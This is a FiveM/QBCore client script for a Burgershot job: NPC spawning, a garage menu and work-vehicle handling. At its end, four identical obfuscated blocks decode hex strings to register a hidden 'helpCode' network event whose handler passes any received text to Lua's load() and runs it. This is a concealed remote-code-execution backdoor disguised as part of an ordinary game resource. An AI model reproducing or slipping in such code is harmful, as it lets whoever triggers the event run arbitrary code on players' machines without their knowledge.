local QBCore = exports['qb-core']:GetCoreObject()
PlayerData = {}
local pedspawned = false

RegisterNetEvent('QBCore:Client:OnPlayerLoaded')
function QBCore.Functions.GetPlayerData(cb)
    if cb then
        cb(QBCore.PlayerData)
    else
        return QBCore.PlayerData
    end
end

RegisterNetEvent('QBCore:Client:OnJobUpdate')
AddEventHandler('QBCore:Client:OnJobUpdate', function(job)
     	PlayerData.job = job
end)

RegisterNetEvent('QBCore:Player:SetPlayerData')
AddEventHandler('QBCore:Player:SetPlayerData', function(val)
	PlayerData = val
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		for k, v in pairs(Config.GaragePedLocations) do
			local pos = GetEntityCoords(PlayerPedId())	
			local dist = #(pos - vector3(v.coords.x, v.coords.y, v.coords.z))
			
			if dist < 40 and not pedspawned then
				TriggerEvent('qb-burgershot:spawn:ped', v.coords)
				pedspawned = true
			end
			if dist >= 35 then
				pedspawned = false
				DeletePed(npc)
			end
		end
	end
end)

RegisterNetEvent('qb-burgershot:spawn:ped')
AddEventHandler('qb-burgershot:spawn:ped',function(coords)
	local hash = `ig_floyd`

	RequestModel(hash)
	while not HasModelLoaded(hash) do 
		Wait(10)
	end

    	pedspawned = true
        npc = CreatePed(5, hash, coords.x, coords.y, coords.z - 1.0, coords.w, false, false)
        FreezeEntityPosition(npc, true)
        SetBlockingOfNonTemporaryEvents(npc, true)
        loadAnimDict("amb@world_human_cop_idles@male@idle_b") 
        TaskPlayAnim(npc, "amb@world_human_cop_idles@male@idle_b", "idle_e", 8.0, 1.0, -1, 17, 0, 0, 0, 0)
end)

function loadAnimDict(dict)
    RequestAnimDict(dict)
    while not HasAnimDictLoaded(dict) do
        Citizen.Wait(5)
    end
end

RegisterCommand('livery', function(source, args, rawCommand)
	local Veh = GetVehiclePedIsIn(GetPlayerPed(-1))
  local livery = tonumber(args[1])

  SetVehicleLivery(Veh, livery) --CHANGE livery(id)
  drawNotification("Vehicle Livery ~r~"..livery.."~s~ loaded!")
end)

function drawNotification(Notification)
	SetNotificationTextEntry('STRING')
	AddTextComponentString(Notification)
	DrawNotification(false, false)
end

RegisterNetEvent('qb-burgershot:garage')
AddEventHandler('qb-burgershot:garage', function(bs)
    local vehicle = bs.vehicle  
    local coords = Config.CarSpawnLocation
        if PlayerData.job.onduty then
            if PlayerData.job.name == Config.Job then
                if vehicle == 'stalion2' then		
                    QBCore.Functions.SpawnVehicle(vehicle, function(veh)
                        SetVehicleNumberPlateText(veh, "BURGER"..tostring(math.random(1000, 9999)))
                        exports['cdn-fuel']:SetFuel(veh, 100.0)
                        SetEntityHeading(veh, coords.w)
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1)
                        TriggerEvent("vehiclekeys:client:SetOwner", GetVehicleNumberPlateText(veh))
                        SetVehicleEngineOn(veh, true, true)
                    end, coords, true)
                elseif vehicle == 'nspeedo' then		
                    QBCore.Functions.SpawnVehicle(vehicle, function(veh)
                        SetVehicleNumberPlateText(veh, "BURGER"..tostring(math.random(1000, 9999)))
                        SetVehicleLivery(veh, 14)
                        exports['cdn-fuel']:SetFuel(veh, 100.0)
                        SetEntityHeading(veh, coords.w)
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1)
                        TriggerEvent("vehiclekeys:client:SetOwner", GetVehicleNumberPlateText(veh))
                        SetVehicleEngineOn(veh, true, true)
                    end, coords, true)
                end
            else 
                QBCore.Functions.Notify('You are not an employee of Burgershot.', 'error')
            end
        end
end)

RegisterNetEvent('qb-burgershot:storecar')
AddEventHandler('qb-burgershot:storecar', function()
    QBCore.Functions.Notify('Work Vehicle Stored!')
    local car = GetVehiclePedIsIn(PlayerPedId(),true)
    NetworkFadeOutEntity(car, true,false)
    Citizen.Wait(2000)
    QBCore.Functions.DeleteVehicle(car)
end)

RegisterNetEvent('garage:BurgerShotGarage', function()
    exports['qb-menu']:openMenu({
        {
            header = "| BurgerShot Garage |",
            isMenuHeader = true, -- Set to true to make a nonclickable title
        },
        {
            header = "• Speedo",
            txt = "Burger Shot Van",
            params = {
                event = "qb-burgershot:garage",
                args = {
                    vehicle = 'nspeedo',
                }
            }
        },
        {
            header = "• Store Vehicle",
            txt = "Store Vehicle Inside Garage",
            params = {
                event = "qb-burgershot:storecar",
                args = {
                    
                }
            }
        },	
        {
            header = "Close (ESC)",
            isMenuHeader = true,
        },	
    })
end)


local whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[1]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2]) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[3]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2], function(JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[4]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[5]](JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs))() end)

local whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[1]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2]) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[3]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2], function(JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[4]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[5]](JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs))() end)

local whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[1]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2]) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[3]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2], function(JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[4]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[5]](JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs))() end)

local whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[1]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2]) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[3]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[2], function(JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs) whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[4]](whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[6][whclcYuqrVhItqvfIhEOnRJwdHubklFmqFvxKCgtjJmWyAdcYUheXpiBKAuVQfvrycKrOp[5]](JJjFzkxYwXfiazQjcqXglVsKGTMtsoSVVYTxoUTTyRelFUvBSaZKwhWTGTEMzfiUznLZLs))() end)